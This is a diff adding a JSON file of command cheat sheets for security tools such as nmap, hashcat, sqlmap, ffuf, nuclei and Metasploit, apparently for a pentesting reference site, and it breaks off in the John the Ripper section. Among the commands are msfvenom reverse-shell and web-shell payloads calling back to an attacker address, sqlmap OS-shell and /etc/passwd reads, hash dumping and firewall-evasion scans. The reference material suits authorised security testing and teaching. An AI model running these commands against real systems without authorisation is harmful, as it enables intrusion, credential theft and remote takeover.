@@ -1,0 +1,557 @@
+{
+  "cheatsheets": [
+    {
+      "slug": "nmap-cheat-sheet",
+      "toolSlug": "nmap",
+      "title": "Nmap Cheat Sheet",
+      "description": "Essential nmap commands for network discovery, port scanning, service enumeration, and firewall evasion. Covers everything from basic host discovery to advanced NSE scripting.",
+      "sections": [
+        {
+          "title": "Host Discovery",
+          "commands": [
+            { "command": "nmap -sn 192.168.1.0/24", "description": "Ping sweep to discover live hosts without port scanning" },
+            { "command": "nmap -Pn -p 80,443 192.168.1.0/24", "description": "Skip host discovery and scan specific ports on all hosts" },
+            { "command": "nmap -sn -PR 10.0.0.0/24", "description": "ARP discovery on local network segment" },
+            { "command": "nmap -sL -dns-server 8.8.8.8 192.168.1.0/24", "description": "List scan with reverse DNS using a specific DNS server" },
+            { "command": "nmap -sn -PE -PP -PM 10.0.0.0/16", "description": "ICMP echo, timestamp, and netmask discovery combined" }
+          ]
+        },
+        {
+          "title": "Scan Types",
+          "commands": [
+            { "command": "nmap -sS -p- 192.168.1.1", "description": "SYN stealth scan on all 65535 ports" },
+            { "command": "nmap -sU --top-ports 100 192.168.1.1", "description": "UDP scan on the top 100 common UDP ports" },
+            { "command": "nmap -sV -sC -p 22,80,443 192.168.1.1", "description": "Version detection with default scripts on specific ports" },
+            { "command": "nmap -sA -p 80 192.168.1.1", "description": "ACK scan to map firewall rulesets" },
+            { "command": "nmap -sN -sF -sX -p 80 192.168.1.1", "description": "NULL, FIN, and Xmas scans for firewall evasion" }
+          ]
+        },
+        {
+          "title": "NSE Scripts",
+          "commands": [
+            { "command": "nmap --script=vuln 192.168.1.1", "description": "Run all vulnerability detection scripts against a target" },
+            { "command": "nmap --script=http-enum -p 80 192.168.1.1", "description": "Enumerate directories and files on a web server" },
+            { "command": "nmap --script=smb-enum-shares,smb-os-discovery -p 445 192.168.1.1", "description": "Enumerate SMB shares and detect OS via SMB" },
+            { "command": "nmap --script=ssl-heartbleed -p 443 192.168.1.1", "description": "Test for Heartbleed vulnerability on HTTPS services" },
+            { "command": "nmap --script=\"default and safe\" 192.168.1.1", "description": "Run only scripts tagged as both default and safe" }
+          ]
+        },
+        {
+          "title": "Output Formats",
+          "commands": [
+            { "command": "nmap -oA scan_results 192.168.1.0/24", "description": "Output in all three formats: normal, XML, and grepable" },
+            { "command": "nmap -oX - 192.168.1.1 | xsltproc - -o report.html", "description": "Generate XML output and convert to HTML report" },
+            { "command": "nmap -oG - 192.168.1.0/24 | grep 'open' | awk '{print $2}'", "description": "Grepable output piped to extract hosts with open ports" },
+            { "command": "nmap --append-output -oN ongoing_scan.txt 192.168.1.1", "description": "Append results to an existing output file" }
+          ]
+        },
+        {
+          "title": "Timing & Performance",
+          "commands": [
+            { "command": "nmap -T4 --min-rate 1000 -p- 192.168.1.1", "description": "Aggressive timing with minimum packet rate of 1000/sec" },
+            { "command": "nmap -T2 --max-retries 2 192.168.1.1", "description": "Polite timing with limited retries for stealth" },
+            { "command": "nmap --min-parallelism 50 --max-parallelism 100 192.168.1.0/24", "description": "Control probe parallelism for large network scans" },
+            { "command": "nmap --host-timeout 5m -p- 192.168.1.0/24", "description": "Skip hosts that take longer than 5 minutes to scan" }
+          ]
+        },
+        {
+          "title": "Firewall Evasion",
+          "commands": [
+            { "command": "nmap -D RND:10 -p 80 192.168.1.1", "description": "Use 10 random decoy IP addresses to obscure the scan origin" },
+            { "command": "nmap -f --mtu 24 -p 80 192.168.1.1", "description": "Fragment packets with a custom MTU to bypass packet filters" },
+            { "command": "nmap --source-port 53 -p 80 192.168.1.1", "description": "Spoof source port as DNS to bypass poorly configured firewalls" },
+            { "command": "nmap --data-length 50 -p 80 192.168.1.1", "description": "Append random data to packets to avoid signature-based detection" },
+            { "command": "nmap -sS --scan-delay 5s --max-scan-delay 10s 192.168.1.1", "description": "Introduce delays between probes to evade rate-based IDS" }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "hashcat-cheat-sheet",
+      "toolSlug": "hashcat",
+      "title": "Hashcat Cheat Sheet",
+      "description": "GPU-accelerated password cracking with hashcat. Covers attack modes, hash type identifiers, rule-based mutations, mask attacks, and session management for long-running jobs.",
+      "sections": [
+        {
+          "title": "Attack Modes",
+          "commands": [
+            { "command": "hashcat -m 0 -a 0 hashes.txt wordlist.txt", "description": "Straight dictionary attack against MD5 hashes" },
+            { "command": "hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt", "description": "Combination attack joining words from two wordlists" },
+            { "command": "hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a", "description": "Brute-force attack with mask for 6-character all-charset passwords" },
+            { "command": "hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d?d", "description": "Hybrid wordlist + mask appending 4 digits to each word" },
+            { "command": "hashcat -m 0 -a 7 hashes.txt ?d?d?d wordlist.txt", "description": "Hybrid mask + wordlist prepending 3 digits to each word" }
+          ]
+        },
+        {
+          "title": "Common Hash Types",
+          "commands": [
+            { "command": "hashcat -m 1000 hashes.txt wordlist.txt", "description": "Crack NTLM hashes (Windows authentication)" },
+            { "command": "hashcat -m 1800 hashes.txt wordlist.txt", "description": "Crack sha512crypt hashes ($6$ Linux shadow entries)" },
+            { "command": "hashcat -m 3200 hashes.txt wordlist.txt", "description": "Crack bcrypt ($2a$) hashes" },
+            { "command": "hashcat -m 13100 hashes.txt wordlist.txt", "description": "Crack Kerberoast TGS-REP (RC4) hashes" },
+            { "command": "hashcat -m 22000 capture.hc22000 wordlist.txt", "description": "Crack WPA2/WPA3 PMKID and EAPOL hashes" }
+          ]
+        },
+        {
+          "title": "Rules",
+          "commands": [
+            { "command": "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule", "description": "Apply best64 rule set for common password mutations" },
+            { "command": "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/d3ad0ne.rule", "description": "Apply d3ad0ne rules for aggressive mutation coverage" },
+            { "command": "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/toggles1.rule", "description": "Toggle case on each character position" },
+            { "command": "hashcat -m 0 -a 0 hashes.txt wordlist.txt -r r1.rule -r r2.rule", "description": "Chain two rule files for combined mutations (multiplicative)" }
+          ]
+        },
+        {
+          "title": "Mask Attacks",
+          "commands": [
+            { "command": "hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?d", "description": "Mask: uppercase letter, 4 lowercase, 3 digits (e.g., Admin123)" },
+            { "command": "hashcat -m 0 -a 3 --increment --increment-min 6 --increment-max 10 hashes.txt ?a?a?a?a?a?a?a?a?a?a", "description": "Incremental mask from 6 to 10 characters across all charsets" },
+            { "command": "hashcat -m 0 -a 3 -1 ?l?d hashes.txt ?1?1?1?1?1?1?1?1", "description": "Custom charset: lowercase letters and digits, 8 characters" },
+            { "command": "hashcat -m 0 -a 3 hashes.txt company?d?d?d?d", "description": "Fixed prefix with 4-digit suffix mask" }
+          ]
+        },
+        {
+          "title": "Session Management",
+          "commands": [
+            { "command": "hashcat -m 0 -a 0 hashes.txt wordlist.txt --session=crack1", "description": "Start a named session for later restoration" },
+            { "command": "hashcat --session=crack1 --restore", "description": "Restore and continue a previously interrupted session" },
+            { "command": "hashcat -m 0 -a 0 hashes.txt wordlist.txt -o cracked.txt --outfile-format=2", "description": "Output cracked passwords only (no hash) to a file" },
+            { "command": "hashcat -m 0 hashes.txt --show", "description": "Display already cracked hashes from the potfile" },
+            { "command": "hashcat -m 0 -a 0 hashes.txt wordlist.txt --potfile-disable", "description": "Disable potfile to re-crack previously found hashes" }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "sqlmap-cheat-sheet",
+      "toolSlug": "sqlmap",
+      "title": "SQLMap Cheat Sheet",
+      "description": "Automated SQL injection detection and exploitation with sqlmap. From basic URL testing through database enumeration, OS-level access, and WAF bypass techniques.",
+      "sections": [
+        {
+          "title": "Basic Usage",
+          "commands": [
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --batch", "description": "Test a URL parameter for SQL injection with auto-confirm" },
+            { "command": "sqlmap -r request.txt --batch", "description": "Test injection from a saved HTTP request file (from Burp)" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --forms --batch", "description": "Automatically detect and test HTML forms on a page" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --cookie=\"session=abc123\" --batch", "description": "Test with authentication cookies" },
+            { "command": "sqlmap -u \"http://target.com/api/v1/users\" --method=POST --data=\"id=1&name=test\" --batch", "description": "Test POST parameters for injection" }
+          ]
+        },
+        {
+          "title": "Injection Techniques",
+          "commands": [
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --technique=BEU --batch", "description": "Use only boolean-blind, error-based, and UNION techniques" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --level=5 --risk=3 --batch", "description": "Maximum detection level and risk for thorough testing" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --prefix=\"')\" --suffix=\"-- -\" --batch", "description": "Custom injection prefix and suffix for complex queries" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --second-url=\"http://target.com/result\" --batch", "description": "Second-order injection where result appears on a different page" }
+          ]
+        },
+        {
+          "title": "Enumeration",
+          "commands": [
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --dbs --batch", "description": "Enumerate all available databases" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" -D dbname --tables --batch", "description": "List all tables in a specific database" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" -D dbname -T users --dump --batch", "description": "Dump all rows from the users table" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --current-user --current-db --is-dba --batch", "description": "Get current DB user, database name, and DBA status" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --passwords --batch", "description": "Enumerate and attempt to crack database user password hashes" }
+          ]
+        },
+        {
+          "title": "OS Access",
+          "commands": [
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --os-shell --batch", "description": "Attempt to spawn an interactive OS shell via SQL injection" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --os-cmd=\"whoami\" --batch", "description": "Execute a single OS command through the injection point" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --file-read=\"/etc/passwd\" --batch", "description": "Read a file from the server filesystem via injection" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --file-write=\"shell.php\" --file-dest=\"/var/www/html/shell.php\" --batch", "description": "Upload a local file to the target server" }
+          ]
+        },
+        {
+          "title": "Tamper Scripts & Evasion",
+          "commands": [
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --tamper=space2comment --batch", "description": "Replace spaces with inline comments to bypass WAF" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --tamper=between,randomcase --batch", "description": "Chain tampers: BETWEEN instead of comparison, randomize case" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --random-agent --delay=2 --batch", "description": "Randomize User-Agent and add delay between requests" },
+            { "command": "sqlmap -u \"http://target.com/page?id=1\" --tor --tor-type=SOCKS5 --check-tor --batch", "description": "Route traffic through Tor and verify connectivity" }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "ffuf-cheat-sheet",
+      "toolSlug": "ffuf",
+      "title": "ffuf Cheat Sheet",
+      "description": "Fast web fuzzer for directory discovery, virtual host enumeration, and parameter brute-forcing. Covers filtering, matching, recursion, and integration with wordlists.",
+      "sections": [
+        {
+          "title": "Directory Brute-Forcing",
+          "commands": [
+            { "command": "ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt", "description": "Fuzz directories using the raft medium wordlist" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -e .php,.html,.js,.txt", "description": "Fuzz with file extensions appended to each word" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -e .bak,.old,.swp -fc 403", "description": "Look for backup files while filtering out 403 responses" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -H \"Authorization: Bearer TOKEN\"", "description": "Fuzz directories with an authentication header" }
+          ]
+        },
+        {
+          "title": "Virtual Host Discovery",
+          "commands": [
+            { "command": "ffuf -u http://target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt -fs 0", "description": "Discover virtual hosts by fuzzing the Host header, filter empty responses" },
+            { "command": "ffuf -u http://10.10.10.10 -H \"Host: FUZZ.target.com\" -w subdomains.txt -mc 200", "description": "Vhost discovery against an IP, match only 200 status codes" },
+            { "command": "ffuf -u https://target.com -H \"Host: FUZZ.target.com\" -w subdomains.txt -fl 10", "description": "Filter responses by line count to remove default pages" }
+          ]
+        },
+        {
+          "title": "Parameter Fuzzing",
+          "commands": [
+            { "command": "ffuf -u https://target.com/page?FUZZ=test -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 4242", "description": "Discover hidden GET parameters by filtering default response size" },
+            { "command": "ffuf -u https://target.com/api -X POST -d '{\"FUZZ\":\"value\"}' -H \"Content-Type: application/json\" -w params.txt", "description": "Fuzz JSON POST body parameter names" },
+            { "command": "ffuf -u https://target.com/page?id=FUZZ -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -mc 200", "description": "Brute-force numeric parameter values matching 200 responses" },
+            { "command": "ffuf -u https://target.com/page -X POST -d \"user=FUZZ&pass=FUZZ2\" -w users.txt:FUZZ -w passes.txt:FUZZ2 -fc 401", "description": "Clusterbomb attack with two wordlists on separate parameters" }
+          ]
+        },
+        {
+          "title": "Filters & Matchers",
+          "commands": [
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -mc 200,301,302", "description": "Match only specific HTTP status codes" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -fs 1234", "description": "Filter out responses of a specific byte size" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -fw 42", "description": "Filter by word count to remove uniform error pages" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -fr \"not found|error\"", "description": "Filter responses matching a regex pattern in the body" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -ac", "description": "Auto-calibrate filters based on initial response analysis" }
+          ]
+        },
+        {
+          "title": "Recursion & Output",
+          "commands": [
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3", "description": "Recursively fuzz discovered directories up to 3 levels deep" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -o results.json -of json", "description": "Save results as JSON for programmatic processing" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -t 100 -rate 500", "description": "Run with 100 threads capped at 500 requests per second" },
+            { "command": "ffuf -u https://target.com/FUZZ -w wordlist.txt -o results.csv -of csv -v", "description": "Verbose CSV output including redirect locations" }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "nuclei-cheat-sheet",
+      "toolSlug": "nuclei",
+      "title": "Nuclei Cheat Sheet",
+      "description": "Template-based vulnerability scanner for fast, configurable security checks. Covers template selection, severity filtering, rate limiting, output formatting, and workflow orchestration.",
+      "sections": [
+        {
+          "title": "Template Selection",
+          "commands": [
+            { "command": "nuclei -u https://target.com -t cves/", "description": "Scan using all CVE detection templates" },
+            { "command": "nuclei -u https://target.com -t exposures/ -t misconfigurations/", "description": "Scan with multiple template directories" },
+            { "command": "nuclei -u https://target.com -tags xss,sqli", "description": "Run only templates tagged as XSS or SQLi" },
+            { "command": "nuclei -u https://target.com -et takeovers/", "description": "Exclude subdomain takeover templates from scan" },
+            { "command": "nuclei -update-templates", "description": "Update the nuclei template repository to latest version" }
+          ]
+        },
+        {
+          "title": "Severity Filtering",
+          "commands": [
+            { "command": "nuclei -l urls.txt -s critical,high", "description": "Scan a list of URLs for only critical and high severity issues" },
+            { "command": "nuclei -u https://target.com -s medium -tags cve", "description": "Find medium-severity CVEs on a single target" },
+            { "command": "nuclei -l urls.txt -es info,low", "description": "Exclude informational and low severity findings" }
+          ]
+        },
+        {
+          "title": "Rate Limiting & Performance",
+          "commands": [
+            { "command": "nuclei -l urls.txt -rl 100 -c 25", "description": "Limit to 100 requests/sec with 25 concurrent templates" },
+            { "command": "nuclei -l urls.txt -bs 50 -hbs 10", "description": "Process 50 templates and 10 hosts in each batch" },
+            { "command": "nuclei -l urls.txt -timeout 10 -retries 2", "description": "Set 10-second timeout with 2 retries per request" },
+            { "command": "nuclei -l urls.txt -headless -headc 5", "description": "Enable headless browser templates with 5 concurrent browsers" }
+          ]
+        },
+        {
+          "title": "Output & Reporting",
+          "commands": [
+            { "command": "nuclei -l urls.txt -o results.txt", "description": "Save scan results to a plain text file" },
+            { "command": "nuclei -l urls.txt -jsonl -o results.jsonl", "description": "Output results in JSON Lines format for parsing" },
+            { "command": "nuclei -l urls.txt -me output_dir/", "description": "Export matched results organized by template to a directory" },
+            { "command": "nuclei -l urls.txt -ms -o results.txt", "description": "Include matched response content in the output" }
+          ]
+        },
+        {
+          "title": "Workflows & Automation",
+          "commands": [
+            { "command": "nuclei -l urls.txt -w workflows/wordpress-workflow.yaml", "description": "Run a predefined WordPress assessment workflow" },
+            { "command": "cat urls.txt | nuclei -t cves/ -s critical -silent | notify", "description": "Pipe critical CVE findings to notification tool" },
+            { "command": "subfinder -d target.com -silent | httpx -silent | nuclei -t cves/ -s critical,high", "description": "Full pipeline: subdomain enum to live hosts to vulnerability scan" },
+            { "command": "nuclei -l urls.txt -t cves/ -H \"Authorization: Bearer TOKEN\"", "description": "Scan authenticated endpoints with a custom header" }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "subfinder-cheat-sheet",
+      "toolSlug": "subfinder",
+      "title": "Subfinder Cheat Sheet",
+      "description": "Passive subdomain discovery tool that aggregates results from dozens of sources. Fast, configurable, and designed to integrate with the ProjectDiscovery toolchain.",
+      "sections": [
+        {
+          "title": "Basic Usage",
+          "commands": [
+            { "command": "subfinder -d target.com", "description": "Enumerate subdomains for a single domain" },
+            { "command": "subfinder -dL domains.txt", "description": "Enumerate subdomains for a list of domains from a file" },
+            { "command": "subfinder -d target.com -recursive", "description": "Recursively enumerate subdomains of discovered subdomains" },
+            { "command": "subfinder -d target.com -all", "description": "Use all sources including slower ones for maximum coverage" }
+          ]
+        },
+        {
+          "title": "Source Configuration",
+          "commands": [
+            { "command": "subfinder -d target.com -sources shodan,virustotal,censys", "description": "Use only specific enumeration sources" },
+            { "command": "subfinder -d target.com -es github,rapiddns", "description": "Exclude specific sources from enumeration" },
+            { "command": "subfinder -ls", "description": "List all available subdomain enumeration sources" },
+            { "command": "subfinder -d target.com -nW", "description": "Remove wildcard and dead subdomains from results" }
+          ]
+        },
+        {
+          "title": "Output Options",
+          "commands": [
+            { "command": "subfinder -d target.com -o subdomains.txt", "description": "Save discovered subdomains to a text file" },
+            { "command": "subfinder -d target.com -oJ -o subdomains.json", "description": "Output results in JSON format with source metadata" },
+            { "command": "subfinder -d target.com -cs -o results.txt", "description": "Include the source that found each subdomain in output" },
+            { "command": "subfinder -d target.com -silent", "description": "Output only subdomains with no banner or status info" }
+          ]
+        },
+        {
+          "title": "Pipeline Integration",
+          "commands": [
+            { "command": "subfinder -d target.com -silent | httpx -silent", "description": "Pipe subdomains to httpx to find live web servers" },
+            { "command": "subfinder -d target.com -silent | httpx -silent | nuclei -s critical", "description": "Full recon pipeline: subdomains to live hosts to critical vulns" },
+            { "command": "subfinder -d target.com -silent | dnsx -a -resp", "description": "Resolve discovered subdomains and display A records" },
+            { "command": "subfinder -d target.com -silent | naabu -p 80,443,8080,8443 -silent", "description": "Port scan discovered subdomains for common web ports" },
+            { "command": "subfinder -d target.com -silent | httpx -title -status-code -tech-detect", "description": "Probe subdomains for titles, status codes, and technologies" }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "metasploit-cheat-sheet",
+      "toolSlug": "metasploit",
+      "title": "Metasploit Cheat Sheet",
+      "description": "The Metasploit Framework for penetration testing, exploit development, and post-exploitation. Covers msfconsole navigation, payload generation, exploit usage, and post-exploitation modules.",
+      "sections": [
+        {
+          "title": "MSFConsole Basics",
+          "commands": [
+            { "command": "msfconsole -q", "description": "Start Metasploit console in quiet mode without the banner" },
+            { "command": "search type:exploit platform:windows smb", "description": "Search for Windows SMB exploits in the module database" },
+            { "command": "search cve:2021 rank:excellent", "description": "Find excellent-ranked exploits by CVE year" },
+            { "command": "use exploit/multi/handler", "description": "Select the multi-handler module for catching reverse shells" },
+            { "command": "info exploit/windows/smb/ms17_010_eternalblue", "description": "Display detailed information about a specific module" }
+          ]
+        },
+        {
+          "title": "Payloads",
+          "commands": [
+            { "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe", "description": "Generate a Windows 64-bit Meterpreter reverse TCP executable" },
+            { "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf", "description": "Generate a Linux reverse shell ELF binary" },
+            { "command": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.10 LPORT=443 -f exe -e x64/xor_dynamic -i 5 -o payload.exe", "description": "Generate encoded HTTPS Meterpreter with 5 encoding iterations" },
+            { "command": "msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f raw -o shell.php", "description": "Generate a PHP Meterpreter web shell" },
+            { "command": "msfvenom --list payloads | grep meterpreter", "description": "List all available Meterpreter payload variants" }
+          ]
+        },
+        {
+          "title": "Running Exploits",
+          "commands": [
+            { "command": "set RHOSTS 192.168.1.0/24\nset RPORT 445\nrun", "description": "Configure target hosts, port, and execute the selected exploit" },
+            { "command": "set PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 10.10.10.10\nset LPORT 4444", "description": "Configure payload with callback address and port" },
+            { "command": "check", "description": "Check if the target is vulnerable without exploiting it" },
+            { "command": "exploit -j", "description": "Run the exploit as a background job" },
+            { "command": "sessions -l", "description": "List all active sessions (shells and meterpreter)" }
+          ]
+        },
+        {
+          "title": "Post-Exploitation",
+          "commands": [
+            { "command": "sessions -i 1", "description": "Interact with session ID 1" },
+            { "command": "run post/multi/recon/local_exploit_suggester", "description": "Suggest local privilege escalation exploits for the target" },
+            { "command": "run post/windows/gather/hashdump", "description": "Dump password hashes from a compromised Windows host" },
+            { "command": "run post/multi/manage/autoroute SUBNET=10.0.0.0/24", "description": "Add a route through a compromised host for pivoting" },
+            { "command": "run post/windows/gather/enum_logged_on_users", "description": "Enumerate currently and recently logged-on users" }
+          ]
+        },
+        {
+          "title": "Handlers & Listeners",
+          "commands": [
+            { "command": "use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST 0.0.0.0\nset LPORT 4444\nexploit -j", "description": "Set up a background listener for reverse TCP Meterpreter" },
+            { "command": "use auxiliary/server/socks_proxy\nset SRVHOST 127.0.0.1\nset SRVPORT 1080\nrun -j", "description": "Start a SOCKS proxy server for pivoting through sessions" },
+            { "command": "use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_https\nset LHOST 0.0.0.0\nset LPORT 443\nset HandlerSSLCert cert.pem\nexploit -j", "description": "HTTPS listener with custom SSL certificate for stealth" }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "wireshark-cheat-sheet",
+      "toolSlug": "wireshark",
+      "title": "Wireshark Cheat Sheet",
+      "description": "Network protocol analyzer for deep packet inspection. Covers display filters by protocol, statistics features, stream following, and tshark CLI equivalents for automation.",
+      "sections": [
+        {
+          "title": "TCP/IP Display Filters",
+          "commands": [
+            { "command": "ip.addr == 192.168.1.1", "description": "Show all traffic to or from a specific IP address" },
+            { "command": "tcp.port == 443 && ip.src == 10.0.0.1", "description": "Filter TCP port 443 traffic from a specific source IP" },
+            { "command": "tcp.flags.syn == 1 && tcp.flags.ack == 0", "description": "Show only TCP SYN packets (new connection attempts)" },
+            { "command": "tcp.analysis.retransmission", "description": "Display only TCP retransmissions to identify network issues" },
+            { "command": "ip.addr == 192.168.1.0/24 && not arp", "description": "Show subnet traffic excluding ARP broadcasts" }
+          ]
+        },
+        {
+          "title": "Application Protocol Filters",
+          "commands": [
+            { "command": "http.request.method == \"POST\"", "description": "Show only HTTP POST requests" },
+            { "command": "dns.qry.name contains \"target.com\"", "description": "Filter DNS queries for a specific domain" },
+            { "command": "tls.handshake.extensions_server_name contains \"target\"", "description": "Filter TLS traffic by SNI hostname" },
+            { "command": "http.response.code >= 400", "description": "Show HTTP error responses (4xx and 5xx)" },
+            { "command": "smtp || pop || imap", "description": "Display all email protocol traffic" }
+          ]
+        },
+        {
+          "title": "Statistics & Analysis",
+          "commands": [
+            { "command": "Statistics > Conversations > TCP", "description": "View all TCP conversations sorted by bytes transferred" },
+            { "command": "Statistics > Protocol Hierarchy", "description": "See protocol distribution breakdown of the capture" },
+            { "command": "Statistics > Endpoints > IPv4", "description": "List all IPv4 endpoints with packet and byte counts" },
+            { "command": "Statistics > HTTP > Requests", "description": "Summarize all HTTP requests by host and URI" },
+            { "command": "Analyze > Expert Information", "description": "Review warnings, errors, and anomalies detected in the capture" }
+          ]
+        },
+        {
+          "title": "Following Streams",
+          "commands": [
+            { "command": "Right-click packet > Follow > TCP Stream", "description": "Reconstruct and view the full TCP conversation" },
+            { "command": "Right-click packet > Follow > HTTP Stream", "description": "View complete HTTP request/response exchanges" },
+            { "command": "Right-click packet > Follow > TLS Stream", "description": "View decrypted TLS stream (requires key log file)" },
+            { "command": "tcp.stream eq 5", "description": "Filter to display only TCP stream index 5" }
+          ]
+        },
+        {
+          "title": "tshark CLI",
+          "commands": [
+            { "command": "tshark -i eth0 -w capture.pcap -a duration:60", "description": "Capture on eth0 for 60 seconds and save to pcap" },
+            { "command": "tshark -r capture.pcap -Y \"http.request\" -T fields -e http.host -e http.request.uri", "description": "Extract HTTP hosts and URIs from a capture file" },
+            { "command": "tshark -r capture.pcap -qz io,stat,30", "description": "Display I/O statistics in 30-second intervals" },
+            { "command": "tshark -r capture.pcap -Y \"dns\" -T json > dns_queries.json", "description": "Export DNS packets as JSON for analysis" },
+            { "command": "tshark -r capture.pcap -qz conv,tcp", "description": "List all TCP conversations from a capture file" }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "burpsuite-cheat-sheet",
+      "toolSlug": "burpsuite",
+      "title": "Burp Suite Cheat Sheet",
+      "description": "Web application security testing platform. Covers proxy configuration, Intruder attack types, Repeater workflows, scanner usage, and extending Burp with extensions.",
+      "sections": [
+        {
+          "title": "Proxy Setup",
+          "commands": [
+            { "command": "Proxy > Options > Add listener on 127.0.0.1:8080", "description": "Configure the default proxy listener address and port" },
+            { "command": "Proxy > Options > Intercept Client Requests > Match and Replace", "description": "Set up automatic header modification for intercepted requests" },
+            { "command": "Project Options > SSL > Import CA Certificate", "description": "Export Burp CA cert for browser installation to intercept HTTPS" },
+            { "command": "Proxy > HTTP history > Filter > Show only in-scope items", "description": "Filter proxy history to show only target scope traffic" },
+            { "command": "Target > Scope > Add > .*\\.target\\.com$", "description": "Add a regex pattern to define the target scope" }
+          ]
+        },
+        {
+          "title": "Intruder Attacks",
+          "commands": [
+            { "command": "Intruder > Positions > Attack type: Sniper", "description": "Test one payload position at a time with a single wordlist" },
+            { "command": "Intruder > Positions > Attack type: Cluster Bomb", "description": "Test all combinations of multiple payload sets across positions" },
+            { "command": "Intruder > Payloads > Type: Recursive grep", "description": "Extract payload values from previous responses (CSRF token extraction)" },
+            { "command": "Intruder > Options > Grep - Extract > Add", "description": "Define patterns to extract from responses for result analysis" },
+            { "command": "Intruder > Resource pool > Maximum concurrent requests: 5", "description": "Limit request rate to avoid triggering WAF or rate limits" }
+          ]
+        },
+        {
+          "title": "Repeater & Decoder",
+          "commands": [
+            { "command": "Right-click request > Send to Repeater", "description": "Send a request to Repeater for manual modification and replay" },
+            { "command": "Repeater > Send group (parallel)", "description": "Send multiple tabs simultaneously for race condition testing" },
+            { "command": "Decoder > Encode as > URL > Base64", "description": "Chain encoding operations for payload transformation" },
+            { "command": "Comparer > Send response to Comparer", "description": "Visually diff two responses to identify behavioral differences" }
+          ]
+        },
+        {
+          "title": "Scanner",
+          "commands": [
+            { "command": "Dashboard > New scan > Crawl and Audit", "description": "Start a full crawl and active vulnerability scan" },
+            { "command": "Dashboard > New scan > Crawl only > Configuration: Browser-powered", "description": "Use embedded browser for JavaScript-heavy application crawling" },
+            { "command": "Target > Site map > Right-click > Actively scan this branch", "description": "Scan a specific portion of the site map only" },
+            { "command": "Dashboard > Issue activity > Export as HTML report", "description": "Generate a formatted HTML vulnerability report" }
+          ]
+        },
+        {
+          "title": "Extensions",
+          "commands": [
+            { "command": "Extender > BApp Store > Install: Autorize", "description": "Install Autorize for automated authorization testing" },
+            { "command": "Extender > BApp Store > Install: Logger++", "description": "Install Logger++ for advanced request/response logging" },
+            { "command": "Extender > BApp Store > Install: Param Miner", "description": "Install Param Miner for hidden parameter and header discovery" },
+            { "command": "Extender > BApp Store > Install: Active Scan++", "description": "Install Active Scan++ for additional active scan checks" },
+            { "command": "Extender > Options > Java environment > Folder for loading library JAR files", "description": "Configure path for custom extension JAR dependencies" }
+          ]
+        }
+      ]
+    },
+    {
+      "slug": "john-cheat-sheet",
+      "toolSlug": "john",
+      "title": "John the Ripper Cheat Sheet",
+      "description": "Versatile password cracker supporting hundreds of hash formats. Covers format detection, wordlist attacks, rule-based mutations, incremental brute-force, and session management.",
+      "sections": [
+        {
+          "title": "Hash Formats",
+          "commands": [
+            { "command": "john --list=formats | grep -i ntlm", "description": "Search available formats for NTLM hash support" },
+            { "command": "john --format=raw-md5 hashes.txt", "description": "Crack plain MD5 hashes" },
+            { "command": "john --format=bcrypt hashes.txt", "description": "Crack bcrypt ($2a$, $2b$) hashes" },
